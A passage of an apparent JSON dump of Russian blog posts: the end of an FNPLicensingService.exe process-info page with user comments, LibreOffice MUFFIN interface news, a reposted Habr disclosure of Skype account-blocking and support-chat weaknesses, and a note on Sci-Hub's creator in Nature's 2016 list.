быть запущен только один раз или каждый раз, когда продукт используется в качестве процесса, ответственного за работу, которая необходима для соответствующей утилиты.\n\nПодробный анализ: FNPLicensingService.exe не является важным для Windows и часто вызывает проблемы. Файл FNPLicensingService.exe находится в подпапках \"C:\\Program Files\\Common Files\". Известны следующие размеры файла для Windows 10/8/7/XP 654,848 байт (80% всех случаев), 651,720 байт и [еще 11 варианта](http://www.filecheck.ru/process/fnplicensingservice.exe.html#).\nПриложение не видно пользователям. Это не системный файл Windows. Поэтому технический рейтинг надежности 38% опасности.\n\nРекомендуем: [Выявление проблем, связанных с FNPLicensingService.exe](http://www.filecheck.ru/tools/pc-scan.html)\n\nЕсли FNPLicensingService.exe находится в подпапках \"C:\\Program Files\", тогда рейтинг надежности 56% опасности. Размер файла 8,704 байт. Нет более детального описания программы. Приложение не видно пользователям. Это не файл Windows.\n\nВажно: Некоторые вредоносные программы маскируют себя как FNPLicensingService.exe, особенно, если они расположены в каталоге c:\\windows или c:\\windows\\system32. Таким образом, вы должны проверить файл FNPLicensingService.exe на вашем ПК, чтобы убедиться, что это угроза. Мы рекомендуем [Security Task Manager](http://www.neuber.com/taskmanager/russian/index.html?ref=filecheck.ru) для проверки безопасности вашего компьютера.\n\nКомментарии пользователей\n\n>FNPLicensingService.exe это служба Windows обеспечивающая функции >лицензирования для програмных продуктов включенных в FLEXnet. Чаще >всего ставиться с програмными продуктами Adobe, такими как Adobe >Photoshop CS3, Adobe Acrobat 8 и т.п. Нормальное месторасположение >\"C:\\Program Files\\Common Files\\Macrovision Shared\\FLEXnet ?>Publisher\\FNPLicensingService.exe\" Службу можно отключить средствами >Windows. \nCapoH4a\n\n>FNPLicensingService.exe это служба Windows обеспечивающая функции >лицензирования для програмных продуктов включенных в FLEXnet. Чаще >всего ставиться с програмными продуктами Adobe, такими как Adobe >Photoshop CS3, Adobe Acrobat 8 и т.п. Нормальное месторасположение >\"C:\\Program Files\\Common Files\\Macrovision Shared\\FLEXnet >Publisher\\FNPLicensingService.exe\" Службу можно отключить средствами >Windows. \n>CapoH4a\n\n>Это служба которая проверяет ваш РС на пираткский софт от Адоб \n>Куаныш\n\n>Это по сути троян от разработчиков программного обеспечения, который >действует без разрешения пользователя, т.е. несанкционированно выходит >в сеть, сверяет данные находящиеся на вашем компьютере. После чего >происходит сбой программ, в основном компании ADOBE. \n>Кондрат Косьяныч\n\n>При отключении FNPLicensingService.exe в Win 7 (x64) установленый >Adobe 8 Pro вылетает при попытке открыть любой файл. Лечится всё это >запуском этого сервиса, но с тотальным запретом на всякую его активность >используя Agnitum Outpost Firewall. \n>Игорь\n\n>Убил процесс и удалил. \n>Rzone\n\n>да, точно, от Адоб, все сходится, потому шоп кракнутый глючить начал \n>падаван\n\n>Не удаляйте эту службу вообще никогда иначе ваш фотошоп будет ругаться >страшной ошибкой 140:20!!! И просто не будет запускаться. Я вот удалил, >теперь пытаюсь восстановить... (дополнительная информация) \n>Михаил\n\n>Если удалить этот file то автокад 2010 и 2011 перестаёт запускаться! И >только автокад LT продожает запускаться и работать. (Ё...ный >AUTODESK) \n>WILLIAM\n\n>acad 2012 без него не запускается \n>Yury\n\n>без FNPLicensingService.exe не зпапускается 3D Max 2011 \n>Дмитрий\n\n>У меня 1 045 546 байт FLEXnet Publisher Common Files W7 \n>Валерий\n\n>Если у вас не запускаются программы Adobe и выдают сообщение со >ссылкой на лицензию,то следует проверить запущена ли у вас эта служба. >Чтобы запустить: Панель управления - Администрирование - Службы - >FlEXnet Licensing Service - Зайти в свойства, установить тип запуска >\"Вручную\" и запустить. \n>Валера\n\n>Бестолковая служба. ZOG хочет контролировать ваши компьютеры через >эти ваши фотошопики, автокады и иже с ними. Отключил, удалять не стал, >ибо все равно вырублен. Фотошоп CS3 запускается без проблем. \n>Кола\n\n>Запускается вместе с Fiery Command Workstation 5. При закрытии службы >FCW продолжает работать \n>Андрей"
		},
		{
			"post_id": 8,
			"title": "Разработчики LibreOffice представили новую концепцию модульного интерфейса",
			"date_published": 1482416595.604,
			"body": "Организация Document Foundation, курирующая разработку LibreOffice, [представила](https://blog.documentfoundation.org/blog/2016/12/21/the-document-foundation-announces-the-muffin-a-new-tasty-user-interface-concept-for-libreoffice/) новую концепцию построения интерфейса свободного офисного пакета, развиваемую под кодовым именем [MUFFIN](https://design.blog.documentfoundation.org/2016/12/21/evolving-past-the-restrictions-of-toolbars/) (My User Friendly & Flexible INterface). Основной идеей предложенной концепции является предоставление гибкого решения для разных предпочтений пользователей, условий работы и видов оборудования. MUFFIN предлагает комбинацию различных элементов пользовательского интерфейса, оптимальных для различных классов пользователей, и даёт возможность пользователю решать, какой предпочесть интерфейс, вместо навязывания одного универсального внешнего вида.\n---\nПервые наработки MUFFIN будут включены в состав LibreOffice 5.3. Пользователям LibreOffice 5.3 будет предложено четыре вида компановки интерфейса: стандартная с панелями инструментов (по умолчанию), минималистичная с однострочной панелью, комбинация однострочной панели с боковой панелью, панель Notebook Bar в стиле MS Office (экспериментальная, требует изменения настроек):\n\nСтандартная панель, предлагаемая по умолчанию:\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482391097.png \"\")\n\nОднострочная панель для экономии вертикального экранного пространства;\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482391137.png \"\")\n\nБоковая панель, для широкоформатных мониторов;\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482391217.png \"\")\n\nПанель NotebookBar, оформленная в стиле Ribbon и привычная для пользователей Microsoft Office.\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482391252.png \"\")\n\nКонтекстный группы в панели [NotebookBar](https://www.opennet.ru/opennews/art.shtml?num=45698), предлагающие разные инструменты в зависимости от текущего режима работы.\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482394453.png \"\")\n\nОсновные задачи, которые попытались решить разработчики MUFFIN:\n- Учёт предпочтений пользователей, которым необходим персональный интерфейс, предлагающий серию опций для сохранения уже выработанных привычек;\n\n- Предоставление возможностями выбора между различными уровнями дружественности пользователю без навязывания какого-то одного подхода. Наличие вариантов как для начинающих, которым необходима простота восприятия, так и для опытных пользователей, которым важна производительность выполнения работы и наличие быстрого доступа к расширенным возможностям;\n\n- Гибкость адаптации для различных аппаратных платформ: предоставление оптимального интерфейса для ноутбуков с небольшими экранами, настольных систем с большими мониторами, широкоформатных экранов. Наличие выбора режимов, оптимизированных для экранов различного размера и разрешения, вместо попытки развития одного унифицированного интерфейса.\n\n[opennet](http://mobile.opennet.ru//opennews/art.shtml?num=45747)"
		},
		{
			"post_id": 7,
			"title": "Как Skype уязвимости чинил",
			"date_published": 1482334931.591,
			"body": "С момента приобретения компанией M$ Skype превратился в УГ. Но я не думал что до такой степени:\n\n**Статья с хабра**\n\n![картинка](https://habrastorage.org/files/09a/f14/e02/09af14e02e2b40178b7f543e83707803.png \"\")\n\n\n---\n**Короткий ответ: никак, им пофиг.**\n\nВ статье описываются мои безуспешные попытки убедить сотрудников Microsoft, что их сервис уязвим, а также унижения, которые приходится выносить пользователям Skype. Под катом невежество, боль и отчаяние.\n\nUPD\n\nСтатья на английском [https://hub.zhovner.com/geek/how-skype-fixes-security-vulnerabilities/](https://hub.zhovner.com/geek/how-skype-fixes-security-vulnerabilities/)\n\nПост на HackerNews [https://news.ycombinator.com/item?id=13227480](https://news.ycombinator.com/item?id=13227480)\n\nTL;DR:\n\n\n\n- Любой может заблокировать ваш аккаунт навсегда так, что вы больше не сможете им пользоваться. Для этого достаточно знать только имя аккаунта. В большинстве случаев Skype откажет вам в восстановлении доступа. Microsoft знает об этой проблеме несколько лет.\n \n- Механизм генерации восьмизначных одноразовых кодов аутентификации (Microsoft Security Code), которые используются для восстановления пароля к аккаунту Microsoft, уязвим. Атакующий может угадать код.\n \n- Техподдержка Skype уязвима для атак социальной инженерии. Microsoft считает это нормальным.\n\n- Техподдержка Skype не знает, что на самом деле происходит с вашим аккаунтом, и почему он заблокирован. В любом случае вы получите стандартный ответ, что ваш аккаунт заблокирован за нарушение правил, даже если аккаунт был удален по вашему запросу.\n \n- Skype по-прежнему раскрывает ваш IP-адрес, в том числе и локальный (тот, что на сетевом интерфейсе). В некоторых случаях возможно раскрытие контактов, подключенных с того же внешнего IP-адреса, что и вы. Например, членов семьи, подключенных к домашнему роутеру.\n \n- Атакующий может скрыть активную сессию из списка авторизованных клиентов (команда /showplaces) используя старые версии SDK. Таким образом, зная пароль, можно незаметно просматривать переписку жертвы.\n \n\n**Обо мне**\n(об авторе статьи)\n\nЯ пользуюсь скайпом около десяти лет. Раньше я мог назвать себя настоящим фанбоем скайпа.\nКогда был доступен публичный баг-трекер jira.skype.com, я активно пытался улучшить Skype, рапортовал о багах. \n\nНапример, SCW-2778 Remote DoS exploit. Эта уязвимость позволяла удаленно обрушить десктопную версию Skype для Windows так, что программа не запускалась без очистки истории.\n\nИли SCW-3328, которая позволяла удаленно включить отключенный микрофон во время звонка.\n\nУже тогда Skype настораживал своим подходом к исправлению багов. Мне приходилось буквально умолять разработчиков исправить проблему, которую не могли починить годами! Вот как это выглядело.\n\nЯ пользовался всеми продуктами Skype, инструментами для разработки Skype4Com, Skypekit. Покупал premium-подписки. Продвинул на работе идею купить Skype For Business. Писал ботов, сервис для генерации собственных смайлов и т.д.\n\nНо сегодня могу сказать, что я искренне ненавижу Skype. Это отвратительный сервис, погрязший в бюрократии и невежестве сотрудников, абсолютно игнорирующий проблемы и занятый только созданием 3D Видеосмайлов. На сегодняшний день Skype не просто не безопасен, он представляет угрозу для пользователей, потому что его механизмы обеспечения безопасности не работают.\n\n**Хронология событий\n**\nУже на протяжении нескольких лет существуют уязвимости, приводящие к блокировке произвольного Skype-аккаунта. Их несколько, ими активно пользуются злоумышленники и предоставляют в качестве сервиса.\n\nРаньше я много писал про уязвимости скайпа, и ко мне стали обращаться жертвы блокировок, которые находили меня через поиск.\n\nЯ видел разные случаи блокировок Skype-аккаунтов. Пытался помочь людям восстановить доступ и умолял Skype сделать с этим хоть что-то. \n\nОбычно это были блокировки через массовые жалобы. Это давно известный способ, который существует уже много лет. Он настолько старый, что стал частью детской субкультуры, ведущей войны друг с другом в Skype. Но за последний год случилось нечто вопиющее, о чем я не могу молчать. \n\nСпособ 1 — абузы (классический)\n\nВ Skype аккаунт блокируется автоматически, если на него поступило достаточное количество жалоб от других пользователей. Предположительно, более 20 штук. \n\nДля того, чтобы отправить жалобу, не нужно даже добавлять аккаунт в контакт-лист, это можно сделать, найдя аккаунт через поиск и кликнув «заблокировать → сообщить о нарушении».\n\nТаким образом, жертва может не знать об отправленных в ее адрес жалобах.\n\nЭтой технике уже много лет. О ней писали на Хабре, о ней знают даже дети, которые собираются в группы для совместного накручивания жалоб.\n\nВот, например, найденные беглым поиском по vk.com:\n\n> vk.com/block_pidaram_skype\n> vk.com/skype_delete\n> vk.com/blacklistskype\n> vk.com/blockskyp\n> vk.com/eds_snos\n> vk.com/club58649499\n> vk.com/club49404483\n\nТаких сообществ много и в самом Skype. Существует даже отдельная субкультура «вкачивателей». Обычно это дети 12-19 лет, которые объединяются в кланы. Суть их деятельности состоит в максимальном нанесении вреда оппоненту, который выбирается случайным образом.\n\nОсновные баталии происходят в виде словесных дуэлей в групповых звонках. Смысл в том, чтобы максимально унизить собеседника за короткий период времени и зафиксировать это на видео.\n\nВидеозаписи дуэлей (Осторожно: мат и крики)\nНекоторые кланы вкачиваетелей выпускают свой фирменный софт для автоматизации вредоносной деятельности.\n\nДемонстрация программы для массовой рассылки жалоб (Видео). Получается подобие ботнета из собственного контакт-листа, который добровольно абузит присланные аккаунты. Напомню, что для жалобы не нужно добавлять аккаунт жертвы к себе в контакты. То есть на вас может пожаловаться сотня школьников, с которыми вы никогда не общались, и вы этого не узнаете.\n\nЯ лично знаю десяток жертв, чьи аккаунты были удалены таким образом. На все обращения в поддержку Skype отвечают стандартной отпиской:\n\n\n\n> I understand that your Skype account was blocked. I apologize for any inconvenience that this may have caused, but I will be more than happy to look into this for you.\n> \n> Our automatic systems detected that activities which are contrary to Skype’s Terms and Conditions have taken place via your Skype account. As a result, your account has been restricted and will remain restricted until further notice.\n\nПеревод \n\n\n\n> Я понимаю, что ваш аккаунт был заблокирован, и извинюсь за доставленные неудобства. Я буду БОЛЕЕ ЧЕМ СЧАСТЛИВ посмотреть, чем я могу помочь.\n> \n> Наша автоматическая система определила, что вы чмо и нарушаете все правила. Поэтому мы удалили нафиг ваш аккаунт, до свидания.\n\nУгадайте, исправлена ли эта уязвимость на текущий момент? Конечно же нет!\n\n**Блокировка через техподдержку**\n\nОсенью 2015 года мне стали писать люди, пострадавшие от нового вида атаки. На этот раз перед блокировкой аккаунта жертве приходили письма от Microsoft с восьмизначным кодом. Письма были отправлены с ящика verifyme@microsoft.com и имели корректную DKIM-подпись, то есть были точно от Microsoft.\n\n![](https://habrastorage.org/getpro/habr/post_images/c3f/a93/594/c3fa93594abc59015f23a6324442f503.png \"\")\n\nПроведя с друзьями собственное расследование, мы нашли исполнителя атаки. Его объявлениями были заполнены все форумы для малолетних кулхацкеров. \n\nВот его реквизиты:\n\n```\nICQ: 676061500\nSkype: alaaasddsa1.as\nJabber: block_service@xmpp.jp\n```\n\nВот одно из объявлений удалятора:\n\n![](https://habrastorage.org/getpro/habr/post_images/b38/74d/8a7/b3874d8a718696ddc3f6fadf8e80b688.png \"\")\n\nЧтобы проверить, как происходит удаление, я заказал у него удаление моего тестового аккаунта. \nДля чистоты эксперимента были соблюдены такие условия:\n\nАккаунт был зарегистрирован на свежесозданный почтовый ящик, никак не связанный с аккаунтом. Угадать или найти почту от аккаунта в открытых источниках было невозможно.\nБыл установлен сложный пароль из длинной последовательности цифр и букв в разном регистре\nВ контакт-листе были добавлены только доверенные контакты.\nАккаунт не состоял в конференциях и почти не использовался для переписки и звонков\n\nНа протяжении всего процесса удаления я мониторил почтовый ящик и был авторизован в десктопном Skype клиенте.\n\nЧерез несколько часов после оплаты на почту посыпались письма с Microsoft Security Code, как на скриншоте выше. \n\nЗа 10 часов пришло 24 письма с кодами. Забегая вперед скажу, что атакующий в итоге угадывал код подтверждения.\n\nВот все коды из писем, пришедшие за время атаки, с привязкой ко времени получения письма.\nВидно, что отправка происходит короткими всплесками в пределах нескольких минут.\n\n```\nMicrosoft Support Code: 41917837 Fri, 26 Feb 2016 04:25:54 -0800 (PST)\nMicrosoft Support Code: 14793784 Fri, 26 Feb 2016 04:27:32 -0800 (PST)\nMicrosoft Support Code: 58837293 Sat, 27 Feb 2016 03:29:18 -0800 (PST)\nMicrosoft Support Code: 68871688 Sat, 27 Feb 2016 03:29:33 -0800 (PST)\nMicrosoft Support Code: 38424446 Sat, 27 Feb 2016 03:30:33 -0800 (PST)\nMicrosoft Support Code: 25068066 Sat, 27 Feb 2016 03:35:39 -0800 (PST)\nMicrosoft Support Code: 27311897 Sat, 27 Feb 2016 03:58:58 -0800 (PST)\nMicrosoft Support Code: 93194445 Sat, 27 Feb 2016 04:02:43 -0800 (PST)\nMicrosoft Support Code: 32506812 Sat, 27 Feb 2016 04:03:36 -0800 (PST)\nMicrosoft Support Code: 33627494 Sat, 27 Feb 2016 04:05:40 -0800 (PST)\nMicrosoft Support Code: 98350414 Sat, 27 Feb 2016 09:00:03 -0800 (PST)\nMicrosoft Support Code: 12437217 Sat, 27 Feb 2016 11:41:04 -0800 (PST)\nMicrosoft Support Code: 42078695 Sat, 27 Feb 2016 11:42:45 -0800 (PST)\nMicrosoft Support Code: 41321028 Sat, 27 Feb 2016 11:43:09 -0800 (PST)\nMicrosoft Support Code: 44964659 Sat, 27 Feb 2016 11:43:19 -0800 (PST)\nMicrosoft Support Code: 90692933 Sat, 27 Feb 2016 12:50:21 -0800 (PST)\nMicrosoft Support Code: 23696204 Sat, 27 Feb 2016 12:55:18 -0800 (PST)\nMicrosoft Support Code: 60212551 Sat, 27 Feb 2016 12:55:25 -0800 (PST)\nMicrosoft Support Code: 81725942 Sat, 27 Feb 2016 12:58:04 -0800 (PST)\nMicrosoft Support Code: 29172590 Sat, 27 Feb 2016 14:26:54 -0800 (PST)\nMicrosoft Support Code: 28091548 Sat, 27 Feb 2016 14:30:38 -0800 (PST)\nMicrosoft Support Code: 55969586 Sat, 27 Feb 2016 14:54:21 -0800 (PST)\nMicrosoft Support Code: 12424717 Sat, 27 Feb 2016 14:57:59 -0800 (PST)\nMicrosoft Support Code: 36300450 Sat, 27 Feb 2016 14:58:16 -0800 (PST)\n```\n\nПосле того, как письма прекратились, в профиле аккаунта удалились личные данные (имя, фамилия, пол). Остался только логин. В настройках аккаунта на сайте skype.com почтовый ящик сменился с моей почты на deleted@skype.com. Меня разлогинило из десктопного клиента.\n\nНа тот момент мы имели следующие данные:\n\n\n\n- Атакующий не знает почту от аккаунта. Учитывая предыдущие инциденты со взломом аккаунтов, от которых была известна почта, можно было предположить похожую атаку.\n- Пароль от аккаунта достаточно надежен и подбор исключен.\n- Запросов авторизации от незнакомых контактов не происходило. В Skype-клиенте никакой активности не было. Атакующий никак не контактировал с жертвой.\n\nИз этого не было понятно, как именно происходит удаление. Не удавалось найти форму, которая генерирует письма с Microsoft Security Code. Ничего не оставалось, кроме как пытаться выудить информацию у взломщика. Мы с друзьями продолжили заказывать удаление тестовых аккаунтов, и в один момент взломщик, в качестве доказательства выполнения атаки, показал скриншот, на котором оператор техподдержки подтверждает, что аккаунт успешно удален:\n\n![](https://habrastorage.org/getpro/habr/post_images/fec/2ff/787/fec2ff787f245cd7203c7d585371b7a8.png \"\")\nИмя аккаунта заблюрено.\n\nЭто была форма Live Chat Support, доступная аккаунтам с подпиской. Найти ее можно на сайте skype.com, пройдя несколько раз мастер решения проблем. Если выбирать все время «проблема не решена», то на последнем шаге предлагается открыть чат. \n\nЧат открывался со стороннего домена https://sales.liveperson.net. Из описания на сайте видно, что это сторонняя компания, предлагающая услуги поддержки для вашего продукта.\n\nВ итоге процедура удаления аккаунта через чат тех. поддержки выглядела так:\n\n\n\n1. Атакующий говорит: «Пожалуйста, удалите мой аккаунт accountname, потому что я завел другой.\n1. Оператор просит подтвердить владение аккаунтом, назвав код, который был выслан на почту, привязанную к аккаунту. При этом оператор не называет почты, а только ожидает правильный код.\n1. После того, как оператор получит правильный код, аккаунт удаляется. При этом оператор соглашается выслать код повторно несколько раз и не возражает, если названный ему код не подходит.\n\nЗабавно, что в форму чата с поддержкой передается логин, под которым был авторизован клиент на skype.com. То есть оператор, в теории, должен видеть, с каким именно пользователем он общается. От того особенно странно, что можно назвать совершенно любой аккаунт для удаления и оператор послушно согласится начать процедуру удаления. \n\nВ этот момент все еще неясно, как конкретно атакующий успешно завершает процедуру удаления. \n\n**Эй, Microsoft!**\n\nУязвимость очевидна. Бежим кричать тревогу в Skype. \nВедь такую серьезную уязвимость обязательно должны исправить, не так ли?\n\nТак как у Skype нет каких-то публичных контактов для сообщений об уязвимостях, пробую написать на форум. Никто не реагирует, зато в теме отметились другие жертвы этой атаки.\n\nЧерез друзей мне удалось связаться напрямую с сотрудниками Microsoft. Я подробно описал все этапы уязвимости, приложил скриншоты, листинги кодов. Меня заверили, что начато внутреннее расследование. Серьезная компания ведь.\n\nОднако спустя пару месяц ко мне снова обратились новые жертвы этой атаки. Сотрудники Microsoft сообщили, что расследование еще не закончено.\n\nПробую написать в secure@microsoft.com. Это специальный ящик для быстрого реагирования на критические уязвимости. Гарантируется ответ в течение 24 часов. В письме я подробно описываю этапы удаления аккаунта со скриншотами.\n\nОтвет Microsoft Security Response Center:\n![](https://habrastorage.org/getpro/habr/post_images/f3d/4ae/d26/f3d4aed268ea20caf35fe040da0a4806.png \"\")\n\nВольный перевод: это не уязвимость, вы просто дурак.\n\nРаз в неделю я спрашивал, как продвигается расследование у ребят из Microsoft, на что получал ответ, что результата нет. Так продолжалось около ШЕСТИ МЕСЯЦЕВ!!!. \n\nБыло достоверно известно, что атакующий называет правильный код оператору. Иногда со второй-третьей попытки. Стыдно признаться, но мне так и не удалось выяснить как, именно это происходило. Сперва мне казалось, что код генерируется от времени, и поэтому атакующий пытается запросить как можно больше кодов в течение одной минуты, что видно по времени получения писем, но я не смог найти зависимости кода от времени. Возможно, был уязвим сам сервис чатов liveperson.net. \n\nНедавно Skype отказались от сервиса liveperson.net, и чат с агентом поддержки происходит на домене microsoft.com. Процедура удаления скайп-аккаунта теперь недоступна оператору тех. поддержки, и ее нужно выполнять самостоятельно через форму.\n\nНаверное, тут вы подумаете, что уязвимость закрыта. Как бы не так.\n\n**Эксперимент — умереть за ваши грехи**\n\nСпустя год после описанных выше событий, ко мне снова обратились жертвы нашего удалятора скайпов. Теперь письма с Security Code не приходили, очевидно был найден другой способ. \n\nПризнаться, мне вся эта история уже порядком надоела. Я устал умолять, унижаться и выпрашивать исправить уязвимости по многу месяцев.\n\nКак я уже говорил, я пользуюсь скайпом около десяти лет. Моему основному аккаунту zhovner примерно столько же. Мне показалось, что будет нечестно только смотреть на страдания других людей, не пережив этого самому. Тогда я решил провести эксперимент и заказать сразу удаление своего аккаунта.\n\nЗаказ удаления \n\n![](https://habrastorage.org/files/eef/59b/d97/eef59bd9743046ca9037adae00ee7e23.png \"\")\n\nСтоимость работ — 2 тысячи рублей (примерно $30). На этот раз удалятор обозначил три дня на выполнение работы. И действительно, через несколько дней меня разлогинило из скайпа, и больше я не мог в него войти. \n\n![](https://habrastorage.org/files/992/78b/2b5/99278b2b5d2048caad787812a7922eb0.png \"\")\n\n**Общение с техподдержкой Skype**\n\nСразу после блокировки аккаунта я написал в техподдержку Skype. Предположив, что аккаунт был заблокирован старым добрым способом через массовые жалобы, я подробно описал ситуацию.\n\nОригинал переписки можно посмотреть здесь: telegra.ph/Account-blocked-by-mass-abuse-reporting (Читать сверху вниз)\nЯ рекомендую прочитать именно оригинал, чтобы ощутить полностью унижение, которое испытывают невинные жертвы блокировок.\n\nКраткая выдержка из переписки:\n\n><Я> Почему мой аккаунт заблокирован? Я предполагаю, что это результат массовых поддельных жалоб. \n>\n><Skype> Наша автоматическая система заблокировала ваш аккаунт за нарушение правил использования Skype.\n>\n><Я> Ваша система уязвима, с помощью поддельных жалоб можно заблокировать чужой аккаунт, даже если он не выполняет >никаких действий и не нарушает правила. Мой аккаунт был заблокирован именно таким образом. Пожалуйста, проверьте >тщательно.\n>\n><Skype> Мы проверили, наша система не ошибается, вы точно нарушили правила. Наша система очень точна, и все действия >логируются. Мы точно видим, что вы нарушили правила, ваш аккаунт не будет разблокирован никогда. Если хотите >пользоваться скайпом дальше — заводите новый.\n>\n><Я> Ваша система подвержена мошенническим манипуляциям. Вот доказательства.\n>\n><Skype> Нет, наша система не ошибается, инфа 100%\n>\n><Я> Хорошо, назовите мои конкретные действия, которые привели к блокировке.\n>\n><Skype> Вы уже описали эти действия в предыдущих письмах. Вы правы насчет причин блокировки.\n>\n><Я> Вы что, сумасшедшие? Получается, вы подтверждаете, что любой аккаунт может быть удален, если злоумышленник >отправит достаточное количество жалоб? И вы даже не знаете о причинах этих жалоб? Вы знаете, что эти абузы могут быть >отправлены даже без добавления жертвы в контакт-лист. То есть их можно отправить с аккаунта, который никогда даже не >общался с тем, на кого он жалуется. Получается, вы фактически подтверждаете существование такой уязвимости. Это ?>вообще законно? Я планирую обратится в суд.\n>\n><Skype> Мы считаем, что предоставили вам достаточно информации. Вы просто говно и все тут.\n>\n><Я> Это очень серьезная уязвимость. Я считаю, что вы должны тщательно расследовать ее. У меня достаточно данных для ?>воспроизведения этой уязвимости. Мы можем повторить ее на аккаунте, который вы предоставите, который точно не >нарушает правила, и который вы полностью контролируете. Я оплачу удаление этого аккаунта атакующему, и вы сможете >расследовать эту проблему.\n>\n><Skype> Мы понимаем, что вы хотите узнать точную причину удаления вашего аккаунта. Мы уже сообщали вам ранее, что >наша автоматическая система выявления мудаков очень точна. Так вот, вы — мудак. У нас все записано!\n>\n><Я> Хорошо, что если я хочу сообщить об уязвимости? Вот ее подробное описание…\n>\n><Skype> Да нам пофиг вообще, идите в суд или полицию.\n\n**Итог**\n\nНа текущий момент, прошло 15 дней с момента блокировки моего аккаунта. Из переписки с поддержкой видно, что возвращать его не собираются. Но я все-таки рассчитываю его вернуть, и получить извинения от Skype за все унижения, которые мне приходится терпеть, пытаясь сделать их сервис безопаснее.\n\nК сожалению, Skype на сегодняшний день — огромная неповоротливая бюрократическая машина, которая из-за своих размеров и плохой организации не способна выявлять и реагировать на проблемы. Я сильно сомневаюсь, что в ближайшее время что-то изменится. \n\nВ статье описаны уязвимости, которые известны лично мне. По опыту, можно предположить, что существует еще огромное число проблем, о которых я просто не знаю, и которые активно эксплуатируются.\n\nВажно понимать, что таким проблемам подвержен ЛЮБОЙ мессенджер с централизованным управлением, где вся безопасность строится на доверии к администрации. \n\nЕсли вы считаете, что ваш любимый мессенджер более безопасен чем Skype, потому что его сотрудники хорошие ребята, то это большое заблуждение.\n\nЛюди, которые имеют неограниченный доступ к информации всех своих пользователей, могут быть уязвимы к давлению, шантажу или обману. Вряд ли кто-либо готов сидеть в тюрьме или отдать жизнь за сохранность сообщений своих пользователей. И пока существует такой неограниченный доступ, всегда будет соблазн этот доступ использовать неправомерно.\n\nПо-настоящему безопасный мессенджер должен быть построен не на доверии к какой-то группе людей, а на невозможности неправомерного доступа к информации на уровне спецификации.\n\nhttps://habrahabr.ru/post/316912/"
		},
		{
			"post_id": 6,
			"title": "Создательница «пиратского» портала научной литературы стала человеком года по версии журнала Nature",
			"date_published": 1482328171.4,
			"body": "Уроженка Казахстана Александра Элбакян, создавшая портал Sci-Hub с открытым доступом к научным работам, вошла в список десяти людей года, составленный журналом Nature\n\n![](https://rublacklist.net/media/2016/12/elbakyan-sci-hub.jpg \"\")\n---\nЕжегодно один из самых старых и авторитетных общенаучных журналов Nature составляет рейтинг наиболее интересных и значимых открытий, произошедших в мире, и называет имена людей, сделавших вклад в развитие и популяризацию науки. В прошлом году в список вошли российские физики Михаил Еремец и Александр Дроздов, открывшие необычные сверхпроводящие эффекты у сероводорода. В этом году в число ключевых научных фигур попала Александра Элбакян, казахстанско-российский биолог с необычной историей. Она вошла в рейтинг благодаря своему «пиратскому» проекту Sci-Hub.\n\nДля администрации портала это событие стало неожиданностью:\n\n>amazing news: Nature has listed Sci-Hub creator @ringo_ring in 2016 year people in science: https://t.co/BC6G5So68w\n>— Sci Hub (@Sci_Hub) 19 декабря 2016 г.\n\nПортал Sci-Hub Александра создала в 2011 году во время обучения в Казахском национальном техническом университете, когда столкнулась с тем, что к большинству научных работ можно получить доступ только за плату. На Sci-Hub почти все научные статьи доступны для скачивания бесплатно — их энтузиасты изначально покупают на официальных научных сайтах, после чего бесплатно выкладывают на созданном Александрой Элбакян портале. Для нормального функционирования портала, а также приобретения научной литературы Sci-Hub собирает пожертвования, в том числе и в биткоинах, о чём РосКомСвобода писала этой весной.\n\nВ 2015 году американский суд по иску, поданному к Sci-Hub научным издательством Elsevier, распорядился закрыть сайт Элбакян, однако ресурс сменил домены и продолжил работу. На данный момент в его цифровой библиотеке насчитывается более 58 миллионов публикаций. В 2016 году количество скачиваний статей с него составило 75 млн. (3 процентов всех скачиваний научных публикаций в мире).\n\nСреди других участников списка людей года по версии Nature в числе прочих вошли: Демис Хассабис, один из основателей компании DeepMind и создателей системы искусственного интеллекта AlphaGo, победившей чемпиона мира в го этим летом; Габриела Гонсалез — один из создателей детектора LIGO, который зафиксировал гравитационные волны; Гильем Англада-Эскуде, объявивший об обнаружении ближайшей планеты земного типа; врач Селина Мартелли, расследовавшая эпидемию африканского вируса Зика в Южной Америке, и врач Джон Чжан, который провел успешное искусственное оплодотворение с использованием ДНК трех родителей.\n\nВ этом году Sci-Hub был номинирован на премию Википедии в категории «Свободные знания» и даже вошёл в шорт-лист вместе торрент-трекером RuTracker, однако в этом году получить премию им не удалось. Но и признание столь уважаемого издания, как Nature — это не менее важный показатель успешности проекта. С чем РосКомСвобода поздравляет и Sci-Nature, и Александру Элбакян.\n\nhttps://rublacklist.net/24289/"
		}
	]
}